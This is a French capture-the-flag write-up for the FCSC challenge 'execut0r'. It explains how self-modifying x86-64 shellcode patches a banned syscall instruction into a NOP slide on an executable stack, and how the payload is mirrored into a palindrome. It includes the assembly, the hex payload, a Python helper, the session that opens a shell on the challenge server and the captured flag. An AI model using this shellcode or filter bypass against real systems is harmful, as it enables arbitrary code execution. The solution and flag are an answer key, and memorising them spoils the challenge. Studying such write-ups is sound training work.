# Énoncé

Voici un exercice de shellcoding comme on les aime ! [ ou pas :-) ]

SHA256(execut0r) = de551ab323fc4d86cb8567d6839e90162b01a00c7c3ab53703dd99428dc25547.

`nc challenges.france-cybersecurity-challenge.fr 2054`

Note : le binaire à exploiter n'a pas accès à Internet.


# Solution

Pour concocter le shellcode, je me suis beaucoup aidé de :
 - Ce site qui est toujours ultra pratique : https://defuse.ca/online-x86-assembler.htm
 - Un débugger, pour débugger/tester mes shellcodes sur le execut0r local avant de l'envoyer au serveur distant

Comme on le voit dans le script run.py, on ne peut pas utiliser certains types d'instructions qui sont interdites/filtrées !
Il s'agit notamment des `ret` (sachant qu'un `push XXX; ret;` aurait permis de faire l'équivalent d'un `jmp XXX`), de `iret` (retour suite à une interruption), d'interruptions, de syscalls, de jmps et de calls.
Cela est volontairement fait pour nous embêter, c'est difficile d'arriver à exécuter du code arbitraire si tous les moyens d'effectuer des branchements nous sont interdits... Il va donc falloir ruser.

Si on voulait faire un classique syscall `execve('/bin/sh', 0, 0)`, on pourrait exécuter toutes nos instructions (des mov et pop principalement), à part la fameuse instruction `syscall` qui permet de le déclencher !
Donc comment faire pour bypasser ce filtrage ???

Eh bien rien de si sorcier que ça : en inspectant le programme execut0r, on voit que le programme est écrit sur la stack et que celle-ci a les permissions "rwx".
On ne peut certes pas directement insérer une instruction `syscall` dans notre shellcode, par contre rien ne nous empêche d'utiliser les mov, pop, push ou autres...

Comme le shellcode est sur la stack, on peut donc utiliser une instruction du type `mov [rsp+???], $reg` (ou `mov [rbp-???], $reg`) pour aller patcher "at-runtime" notre shellcode afin d'y insérer une instruction que l'on veut... Comme l'instruction syscall !
L'idée serait donc de faire une sorte de self-modifying shellcode, de cette manière :
 - Faire un `mov rcx, 0x909090909090050f` pour charger l'instruction "syscall; nop*6" dans RCX (l'opcode de syscall étant 0x0f05 pour info)
 - Faire un `mov [rsp+???], rcx` pour aller patcher/écrire l'instruction syscall sur notre shellcode.

Reste juste à déterminer l'offset ??? pour que le patch se fasse en plein milieu d'une NOP slide de notre shellcode par exemple.
Pour trouver cet offset, j'ai 1) inséré une NOP slide assez conséquente à la fin de mon shellcode, 2) testé dans un débugger pour voir, par rapport à RSP, quel était l'offset où tombait à peu près cette NOP slide.

--> Finalement j'ai trouvé que la NOP slide tombait environ vers [RSP+136] !

Notons que le programme run.py insère un prologue et un epilogue avant et après notre shellcode, à vrai dire je ne m'en suis guère soucié et le shellcode que je vais faire est assez standalone (= il fonctionne dans tous les cas, qu'il soit exécuté "tout seul" ou avec l'épilogue et le prologue de run.py inséré avant et après).
La seule chose à noter, c'est que le shellcode prologue inséré par run.py reset entre autres RBP à 0 (mais heureusement laisse RSP intact) !
Donc si on doit écrire quelque-chose sur la stack, il faut le faire en passant par RSP et surtout pas par RBP puisqu'il est reset à 0 par le shellcode prologue de run.py !

Ceci étant dit, on peut maintenant écrire notre shellcode ! Outre ce que j'ai expliqué au-dessus, tout le reste est très classique d'un `execve('/bin/sh', 0, 0)`.
Voici le shellcode final :

```
// On push "/bin/sh\0" sur la stack, et on load l'adresse de la string dans RDI
mov rax, 0x0068732f6e69622f
push rax
mov rdi, rsp

// On set les registres comme il faut pour un syscall execve('/bin/sh', 0, 0)
mov rax, 0x3b
mov rsi, 0
mov rdx, 0

// On patche le shellcode écrit sur la stack pour y insérer une instruction syscall
mov rcx, 0x909090909090050f // 0x0f05 = opcode de "syscall"
mov [rsp+136], rcx          // on patche l'instruction dans la NOP slide du shellcode situé sur la stack (on passe par RSP pour ce faire, pas par RBP qui est set à 0 par run.py)


// Le syscall sera écrit/patché par le mov du dessus dans la NOP slide qui suit ! :)
nop * 28
```

En hexa, il nous donne : `48B82F62696E2F736800504889E748C7C03B00000048C7C60000000048C7C20000000048B90F0590909090909048898C248800000090909090909090909090909090909090909090909090909090909090`
Pour qu'il soit accepté par le programme, il ne reste plus qu'à le "palindromer", c'est-à-dire faire en sorte qu'il se lise dans les deux sens... Un peu comme un effet mirroir, ou comme le rendre symétrique en fait !
En gros, si notre shellcode est "01 02 03", il faudra qu'on l'envoie comme ça au programme : "01 02 03 03 02 01"

En quelques lignes de Python on peut "mirroiriser" notre shellcode, voici le script utilisé :

```
#!/usr/bin/python3

def mirroirMirroir(scHex):
    scBytes = bytes.fromhex(scHex)
    scBytesPalindrome = scBytes + scBytes[::-1]
    print(scBytesPalindrome)
    
    scHexPalindrome = bytearray(scBytesPalindrome).hex()
    print(scHexPalindrome)


sc = "48B82F62696E2F736800504889E748C7C03B00000048C7C60000000048C7C20000000048B90F0590909090909048898C248800000090909090909090909090909090909090909090909090909090909090"
mirroirMirroir(sc)
```

Evidemment, la partie "mirroirisée" de notre shellcode va donner des instructions complètement "junk" qui vont faire planter le programme.
MAIS, comme on aura patché et surtout exécuté notre instruction "syscall" AVANT de tomber sur la partie mirroirisée junk... Eh bien on aura ouvert notre shell avant que cette partie soit exécutée !
Donc au final, on n'a pas à se soucier du tout de cette partie, ce qui nous permet de bypasser la contrainte que voulait probablement nous imposer le challmaker :-) (faire des instructions qui s'exécutent de manière cohérente dans les deux sens).

En exécutant le script du-dessus, on obtient : `48b82f62696e2f736800504889e748c7c03b00000048c7c60000000048c7c20000000048b90f0590909090909048898c2488000000909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909000000088248c8948909090909090050fb94800000000c2c74800000000c6c7480000003bc0c748e78948500068732f6e69622fb848`

Ne reste plus qu'à le copier-coller dans l'entrée du programme "run.py" du serveur distant (nc challenges.france-cybersecurity-challenge.fr 2054) :
```
Enter your shellcode (hex, at most 1024 bytes):
48b82f62696e2f736800504889e748c7c03b00000048c7c60000000048c7c20000000048b90f0590909090909048898c2488000000909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909000000088248c8948909090909090050fb94800000000c2c74800000000c6c7480000003bc0c748e78948500068732f6e69622fb848
ls
execut0r
flag.txt
run.py
cat flag.txt
FCSC{662c7ce1f85b5bb4a874a9ecddae4ea9b24d5ef0ce72c28df162ee8311b19ec3}
```

Miracle, on a bien reçu notre flag !
Flag : FCSC{662c7ce1f85b5bb4a874a9ecddae4ea9b24d5ef0ce72c28df162ee8311b19ec3}